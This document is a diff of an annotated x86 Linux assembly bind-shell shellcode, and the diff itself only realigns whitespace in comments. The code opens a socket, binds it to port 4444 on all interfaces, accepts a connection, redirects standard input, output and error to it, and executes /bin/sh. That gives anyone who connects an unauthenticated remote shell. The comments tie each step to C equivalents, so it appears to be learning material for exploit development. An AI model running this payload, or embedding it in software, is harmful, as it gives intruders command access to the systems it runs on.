@@ -6,11 +6,11 @@ global _start
 
 ; Header Files:
 ; -------------------------------------------------------------------------------------------------------
-; |  Linux Syscall description file path: 				|  /usr/include/i386-linux-gnu/asm/unistd_32.h  |
-; |  Linux Socketcall numbers:							|  /usr/include/linux/net.h						|
-; |  Linux IP Protocols Declarations:					|  /usr/include/netinet/in.h					|
+; |  Linux Syscall description file path: 		|  /usr/include/i386-linux-gnu/asm/unistd_32.h  |
+; |  Linux Socketcall numbers:				|  /usr/include/linux/net.h			|
+; |  Linux IP Protocols Declarations:			|  /usr/include/netinet/in.h			|
 ; |  Linux System-specific socket constants and types:	|  /usr/include/i386-linux-gnu/bits/socket.h	|
-; |  Values for setsockopt():							|  /usr/include/asm-generic/socket.h			|
+; |  Values for setsockopt():				|  /usr/include/asm-generic/socket.h		|
 ; -------------------------------------------------------------------------------------------------------
 
 section .text
@@ -27,7 +27,7 @@ sys_socket:
 	; {C code} --> int sock = socket(AF_INET, SOCK_STREAM, 0);
 	
 	; syscall definition
-	mov al, 102 		; syscall - socketcall
+	mov al, 102 			; syscall - socketcall
 	mov bl, 1			; socketcall type - sys_socket
 
 	; pushing the sys_socket atributes in reverse order (AF_INET, SOCK_STREAM, IPPROTO_IP)
@@ -36,15 +36,15 @@ sys_socket:
 	push 1				; SOCK_STREAM = 1
 	push 2				; AF_INET = 2 (PF_INET)
 
-	mov ecx, esp 		; directing the stack pointer to sys_socket() function arguments
+	mov ecx, esp 			; directing the stack pointer to sys_socket() function arguments
 
 	int 128				; syscall execution
 
-	mov edx, eax		; saving the sock pointer for further usage
+	mov edx, eax			; saving the sock pointer for further usage
 
 sys_setsocopt:
 	; {C code} --> int option = 1;
-    ; {C code} --> setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &option, sizeof(option));
+    	; {C code} --> setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &option, sizeof(option));
 	
 	; syscall definition
 	mov al, 102			; syscall - socketcall
@@ -57,15 +57,15 @@ sys_setsocopt:
 	push 1				; SOL_SOCKET = 1
 	push edx			; sock pointer
 
-	mov ecx, esp		; directing the stack pointer to sys_setsocopt() function arguments
-
-	int 128			; syscall execution
+	mov ecx, esp			; directing the stack pointer to sys_setsocopt() function arguments
+	
+	int 128				; syscall execution
 
 sys_bind:
 	; {C code} --> struct sockaddr_in address;
-    ; {C code} --> address.sin_addr.s_addr = INADDR_ANY;
-    ; {C code} --> address.sin_port = htons(PORT);
-    ; {C code} --> address.sin_family = AF_INET;
+    	; {C code} --> address.sin_addr.s_addr = INADDR_ANY;
+   	; {C code} --> address.sin_port = htons(PORT);
+    	; {C code} --> address.sin_family = AF_INET;
 	; {C code} --> bind(sock,(struct sockaddr *)&address, sizeof(address));
 
 	; syscall definition
@@ -75,17 +75,17 @@ sys_bind:
 	; pushing the address struct arguments
 	xor esi, esi
 	push esi			; pushing INADDR_ANY = 0 (null)
-	push word 0x5c11	; PORT = 4444 (change reverse hex value for different port)
+	push word 0x5c11		; PORT = 4444 (change reverse hex value for different port)
 	push word 2			; AF_INET = 2 (must be word, to hold the IP address)
 
-	mov ecx, esp		; directing the stack pointer to address struct arguments
+	mov ecx, esp			; directing the stack pointer to address struct arguments
 	
 	; pushing the sys_bind arguments in reverse order (int sockfd, const struct sockaddr *addr, socklen_t addrlen) 
 	push 16				; socklen_t addrlen (size) = 16
 	push ecx			; const struct sockaddr *addr - stack pointer with struct arguments	
 	push edx			; sock pointer
 
-	mov ecx, esp		; directing the stack pointer to sys_bind() function arguments
+	mov ecx, esp			; directing the stack pointer to sys_bind() function arguments
 
 	int 128				; syscall execution
 
@@ -101,7 +101,7 @@ sys_listen:
 	push esi			; pushing backlog = 0 (null)
 	push edx			; sock pointer
 
-	mov ecx, esp		; directing the stack pointer to sys_listen() function arguments
+	mov ecx, esp			; directing the stack pointer to sys_listen() function arguments
 	
 	int 128				; syscall execution
 
@@ -118,22 +118,22 @@ sys_accept:
 	push esi			; pushing struct sockaddr *addr = 0 (null)
 	push edx			; sock pointer
 
-	mov ecx, esp		; directing the stack pointer to sys_accept() function arguments
+	mov ecx, esp			; directing the stack pointer to sys_accept() function arguments
 
 	int 128				; syscall execution
 
-	mov edx, eax		; saving the return value for further usage
+	mov edx, eax			; saving the return value for further usage
 
 sys_dup2:
 	; {C code} --> dup2(new_sock,2);
-    ; {C code} --> dup2(new_sock,1);
-    ; {C code} --> dup2(new_sock,0);
+    	; {C code} --> dup2(new_sock,1);
+   	; {C code} --> dup2(new_sock,0);
 
 	; syscall definition
 	mov al, 63			; syscall - dup2
 	
-	mov ebx, edx		; overwriting the sock pointer
-	xor ecx, ecx		; STDIN - 0 (null)
+	mov ebx, edx			; overwriting the sock pointer
+	xor ecx, ecx			; STDIN - 0 (null)
 
 	int 128				; syscall execution
 
@@ -159,12 +159,12 @@ sys_execve:
 	xor esi, esi
 	push esi			; pushing 0 (null)
 
-	push 0x68732f6e		; pushing "n/sh"
-	push 0x69622f2f		; pushing "//bi"
+	push 0x68732f6e			; pushing "n/sh"
+	push 0x69622f2f			; pushing "//bi"
 
-    ; pushing the sys_execve arguments (const char *filename, char *const argv[], char *const envp[])
-	mov ebx, esp		; directing the stack pointer to sys_execve() string argument
-	xor ecx, ecx		; char *const envp[] = 0 (null)
-	xor edx, edx		; char *const argv[] = 0 (null)
+   	; pushing the sys_execve arguments (const char *filename, char *const argv[], char *const envp[])
+	mov ebx, esp			; directing the stack pointer to sys_execve() string argument
+	xor ecx, ecx			; char *const envp[] = 0 (null)
+	xor edx, edx			; char *const argv[] = 0 (null)
 
 	int 128				; syscall execution
